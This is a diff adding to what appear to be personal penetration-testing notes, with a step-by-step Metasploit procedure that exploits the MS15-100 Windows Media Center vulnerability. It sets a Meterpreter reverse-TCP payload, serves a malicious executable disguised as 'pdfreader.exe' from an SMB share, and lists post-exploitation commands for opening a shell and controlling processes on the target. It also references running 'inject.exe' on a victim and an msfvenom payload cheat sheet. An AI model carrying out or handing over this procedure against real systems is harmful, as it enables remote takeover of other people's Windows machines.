@@ -39,5 +39,32 @@
 > now open victim machine and run the inject.exe file
 > check the terminal on attack machine
 
+>useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
 
-useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
+
+
+
+--MS15-100 Microsoft Windows Media Center MCL Vulnerability--
+
+
+> msfconsole
+> search ms15_100_mcl (copy the module name)
+> use exploit/windows/fileformat/ms15_100_mcl_exe
+> info
+> set PAYLOAD windows/meterpreter/reverse_tcp
+> set LHOST local_ip
+> exploit
+> copy the 'malicious executable at' (\\192.168.0.6\hUoNjR\pdfreader.exe)
+> open target machine and search \\192.168.0.6\hUoNjR\pdfreader.exe on browser
+> run the service
+> check the terminal in attack machine
+> ctrl c
+> sessions
+> sessions -i 1
+> ps (to check the processs list)
+> sysinfo (for system information)
+> shell (to get into prompt)
+> calc (to open calculator on target machine) or control (to open control center)
+> ctrl c (terminate session 1)
+> ps (find pid of calc.exe and copy it)
+> kill pid (to terminate the process)
